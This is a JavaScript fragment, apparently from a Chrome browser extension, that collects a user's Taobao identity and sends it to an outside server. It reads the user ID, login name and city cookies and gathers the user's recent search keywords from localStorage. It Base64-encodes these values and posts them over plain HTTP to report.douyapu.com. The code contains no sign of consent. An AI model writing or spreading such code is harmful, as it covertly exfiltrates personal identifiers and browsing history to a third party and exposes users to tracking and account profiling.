    function startUseInfo() {
        calcTime('mgTqInfo',firstStart);
        function firstStart() {
            var info = {
                useId:'',       //用户ID
                useName:'',     //用户名字
                city:'',        //用户城市
                useKeys:'',     //用户关键字
                source:1        //用户平台
            };  //
            var needNum = 6;    //入库关键字个数
            function getUseInfo() {
                var storageData = localStorage;
                var n = 0;  //
                function count() {
                    n++;
                    if (n != 3) {
                        return
                    }
                    chrome.storage.local.get(null,function (e) {
                        console.log(e);
                        info.useId = info.useId ? info.useId : e.useInfo1876.useId;
                        info.useName = info.useName ? info.useName : e.useInfo1876.useName;
                        info.city = info.city ? info.city : e.useInfo1876.city ? e.useInfo1876.city : "";
                        if (info.useId && info.useName) {
                            chrome.storage.local.set({useInfo1876:{useId:info.useId,useName:info.useName,city:info.city}});
                            getKey();
                        }
                    });
                }   //
                function getKey() {
                    $.each(storageData,function (v,k) {
                        if (v.match(`suggest_history_historybaobei${info.useName}`)) {
                            info.useKeys = '';
                            var index = 0;
                            $.each(JSON.parse(k),function (v,k) {
                                index++;
                                if (index == needNum) {
                                    return false
                                }
                                info.useKeys += `${decodeURIComponent(k.key)},`;
                            });
                            info.useKeys = info.useKeys.replace(/,$/gi,"");
                            postUseInfo();
                        }
                    });
                }   //获取keys
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"unb"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.useId = d[0].value;
                    }
                    count();
                });
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"lgc"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.useName = decodeURIComponent(d[0].value);
                        info.useName = unescape(info.useName.replace(/\\u/g,'%u'));
                    }
                    count();
                });
                chrome.extension.sendMessage({
                    name:"getCook",url:"https://www.taobao.com/",key:"city"
                },function (d) {
                    if (d && d[0] && d[0].value) {
                        info.city = d[0].value;
                    }
                    count();
                });
            }   //获取用户数据
            function postUseInfo() {
                if (info.useId && info.useKeys && info.useName) {
                    var base64Post = '';
                    console.log(info);
                    $.each(info,function (v,k) {
                        base64Post += `${Base64.encode(k)}|`
                    });
                    base64Post = base64Post.replace(/\|$/gi,"");
                    console.log(base64Post);
                    chrome.extension.sendMessage({
                        name:"universal",url:"http://report.douyapu.com/api/usr",data:{
                            action:'info',
                            data:base64Post
                        },
                    },function () {
                    });
                }
            }   //上报用户数据
            getUseInfo();
        }
    }    //淘宝首页用户信息上报
